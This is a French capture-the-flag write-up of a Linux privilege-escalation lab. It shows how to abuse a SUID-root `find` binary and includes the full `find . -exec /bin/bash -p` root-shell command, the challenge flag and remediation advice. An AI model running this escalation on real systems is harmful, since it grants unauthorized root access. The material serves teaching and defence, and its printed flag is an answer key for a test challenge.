# Writeup — SUID Classic

**Catégorie** : Linux / Privilege Escalation  
**Difficulté** : Easy  
**Points** : 100  
**Flag** : `CTF{suid_find_gtfobins_ez}`

## Contexte

Le bit SUID (Set User ID) sur un exécutable permet à n'importe quel utilisateur de lancer ce programme avec les privilèges du propriétaire du fichier (souvent root). Certains binaires courants comme `find`, `bash`, `python`, etc. peuvent être exploités s'ils ont le SUID bit positionné. Ce challenge illustre le cas classique du binaire `find` avec SUID.

## Connexion

```bash
ssh player@<TARGET_IP> -p 5020
# password: player2026
```

## Étapes de résolution

### 1. Énumération initiale

Après connexion, on commence par identifier les binaires avec le bit SUID :

```bash
player@container:~$ find / -perm -4000 -type f 2>/dev/null
```

Sortie attendue (extrait) :

```
/usr/bin/su
/usr/bin/mount
/usr/bin/passwd
/usr/bin/find          <-- CIBLE
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
```

On remarque immédiatement `/usr/bin/find` dans la liste. C'est inhabituel : `find` n'a normalement pas le SUID bit.

### 2. Identification de la vulnérabilité

On vérifie les permissions de `find` :

```bash
player@container:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 197888 Jan  1 00:00 /usr/bin/find
```

Le `s` en position SUID confirme que `find` s'exécutera avec les privilèges de `root`.

On peut aussi consulter GTFOBins (https://gtfobins.github.io/gtfobins/find/) pour connaître les techniques d'exploitation connues.

### 3. Exploitation

GTFOBins indique que `find` avec le SUID peut être utilisé pour lancer un shell via l'option `-exec` :

```bash
player@container:~$ find . -exec /bin/bash -p \; -quit
```

Explication des options :
- `-exec /bin/bash -p \;` : exécute `/bin/bash` avec l'option `-p` (preserve privileges — ne réinitialise pas l'EUID)
- `-quit` : arrête `find` après le premier résultat (évite de boucler)

Sortie attendue :

```
bash-5.1#
```

On obtient un prompt root (`#` au lieu de `$`). Vérification :

```bash
bash-5.1# whoami
root
bash-5.1# id
uid=0(root) gid=1000(player) euid=0(root)
```

### 4. Récupération du flag

```bash
bash-5.1# cat /root/flag.txt
CTF{suid_find_gtfobins_ez}
```

## Explication de la vulnérabilité

Le bit SUID positionné sur `find` permet à tout utilisateur du système de l'exécuter avec les droits de `root`. Puisque `find` supporte l'option `-exec` qui lance des commandes arbitraires, un attaquant peut lancer un shell ou exécuter n'importe quelle commande en tant que root.

L'option `-p` de bash est cruciale : sans elle, bash réinitialise son EUID au RUID (l'utilisateur courant), neutralisant l'escalade. Avec `-p`, bash conserve l'EUID hérité de find (root).

**Impact réel** : Accès root complet sur le système. Un attaquant peut lire tous les fichiers, modifier la configuration, créer des backdoors, exfiltrer des données sensibles.

## Recommandations de remédiation

1. **Auditer les binaires SUID régulièrement** :
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
2. **Retirer le SUID bit de `find`** :
   ```bash
   chmod u-s /usr/bin/find
   ```
3. **Appliquer le principe du moindre privilège** : n'accorder le SUID que si absolument nécessaire.
4. **Utiliser des outils d'audit** comme Lynis ou aide pour détecter les changements de permissions.
5. **Surveiller les modifications de fichiers SUID** via auditd.

## Références

- GTFOBins - find SUID : https://gtfobins.github.io/gtfobins/find/#suid
- MITRE ATT&CK T1548.001 (Setuid and Setgid) : https://attack.mitre.org/techniques/T1548/001/
- man find(1) : `-exec` option documentation
